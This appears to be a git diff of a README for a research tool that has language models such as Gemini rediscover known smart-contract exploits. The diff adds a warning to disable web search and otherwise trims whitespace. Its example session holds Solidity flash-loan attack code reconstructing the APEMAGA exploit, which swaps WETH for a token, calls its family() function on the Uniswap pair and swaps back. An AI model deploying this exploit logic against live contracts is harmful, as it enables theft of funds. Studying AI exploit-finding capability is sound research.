@@ -35,6 +35,8 @@ llm install llm-ollama
 
 Note that in "manual mode", there is no need to install any plugin as the user will be copying and pasting the prompt and responses.
 
+**Important**: when using an LLM to test with an already known exploit, make sure the web search is not enabled, otherwise they can will have access to the original exploit code.
+
 
 # Getting started
 
@@ -51,7 +53,7 @@ You can use `llm models` to show the available models.
 # Example session
 
 This session shows the different steps to re-discover the [APEMAGA exploit](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/dc2cf9e53e9ccaf2eaf9806bad7cd914edefb41b/src/test/2024-06/APEMAGA_exp.sol#L23).
-While it is likely that this code is part of the millons used to train, Gemini does not seem to be immediately recalling the exploit from memory, but instead, it seems to be trying to understand the code (at least, in some degree).  
+While it is likely that this code is part of the millons used to train, Gemini does not seem to be immediately recalling the exploit from memory, but instead, it seems to be trying to understand the code (at least, in some degree).
 
 ```
 source keys.sh 20175261
@@ -71,7 +73,7 @@ function receiveFlashLoan(
     // 'uniswapRouter' is IUniswapV2Router, available as a state variable
     // 'uniswapPair' is IUniswapV2Pair, available as a state variable
 
-    uint256 amountWethToSwap = 10 ether; 
+    uint256 amountWethToSwap = 10 ether;
 
     // 1. Swap WETH for Tonken
     // Path: WETH -> Tonken
@@ -91,7 +93,7 @@ function receiveFlashLoan(
         address(this), // recipient of Tonken is this contract
         block.timestamp // deadline
     );
-    uint256 initialTonkenBalance = ERC20(token).balanceOf(address(this)); 
+    uint256 initialTonkenBalance = ERC20(token).balanceOf(address(this));
     // console.log("Received %s Tonken. WETH balance after swap: %s", initialTonkenBalance, WETH.balanceOf(address(this)));
     // console.log("Uniswap pair Tonken balance before family call: %s", ERC20(token).balanceOf(address(uniswapPair)));
 
@@ -99,11 +101,11 @@ function receiveFlashLoan(
     // 2. Call Tonken.family() on the Uniswap pair address
     // console.log("Calling Tonken.family() on Uniswap pair %s", address(uniswapPair));
     ITonken(token).family(address(uniswapPair));
-    // console.log("Called Tonken.family(). Uniswap pair Tonken balance after family call: %s", ERC20(token).balanceOf(address(uniswapPair))); 
+    // console.log("Called Tonken.family(). Uniswap pair Tonken balance after family call: %s", ERC20(token).balanceOf(address(uniswapPair)));
 
 
     // 3. Get the current balance of Tonken held by this contract
-    uint256 tonkenBalanceToSwapBack = ERC20(token).balanceOf(address(this)); 
+    uint256 tonkenBalanceToSwapBack = ERC20(token).balanceOf(address(this));
     // console.log("Tonken balance to swap back: %s", tonkenBalanceToSwapBack);
     require(tonkenBalanceToSwapBack > 0, "No Tonken to swap back");
 
@@ -124,8 +126,8 @@ function receiveFlashLoan(
         block.timestamp // deadline
     );
     // console.log("Swapped Tonken back to WETH. WETH balance: %s", WETH.balanceOf(address(this)));
-    
-    // DO NOT MODIFY THE FOLLOWING CODE 
+
+    // DO NOT MODIFY THE FOLLOWING CODE
     ...
 }
 ```
@@ -160,7 +162,7 @@ function receiveFlashLoan(
         address(this), // recipient of Tonken is this contract
         block.timestamp // deadline
     );
-    uint256 initialTonkenBalance = ERC20(token).balanceOf(address(this)); 
+    uint256 initialTonkenBalance = ERC20(token).balanceOf(address(this));
     // console.log("Received %s Tonken. WETH balance after 1st swap: %s", initialTonkenBalance, WETH.balanceOf(address(this)));
     // console.log("Uniswap pair Tonken balance before family call: %s", ERC20(token).balanceOf(address(uniswapPair)));
     // console.log("Uniswap pair WETH balance before family call: %s", WETH.balanceOf(address(uniswapPair)));
@@ -182,7 +184,7 @@ function receiveFlashLoan(
     // (Pair's internal WETH reserve reflects WETH deposited in step 1)
 
     // 4. Get the current balance of Tonken held by this contract to swap back
-    uint256 tonkenBalanceToSwapBack = ERC20(token).balanceOf(address(this)); 
+    uint256 tonkenBalanceToSwapBack = ERC20(token).balanceOf(address(this));
     // console.log("Tonken balance to swap back: %s", tonkenBalanceToSwapBack);
     require(tonkenBalanceToSwapBack > 0, "No Tonken to swap back");
 
@@ -203,8 +205,8 @@ function receiveFlashLoan(
         block.timestamp // deadline
     );
     // console.log("Swapped Tonken back to WETH. Final WETH balance before repay: %s", WETH.balanceOf(address(this)));
-    
-    // DO NOT MODIFY THE FOLLOWING CODE 
+
+    // DO NOT MODIFY THE FOLLOWING CODE
     ...
 }
 ```
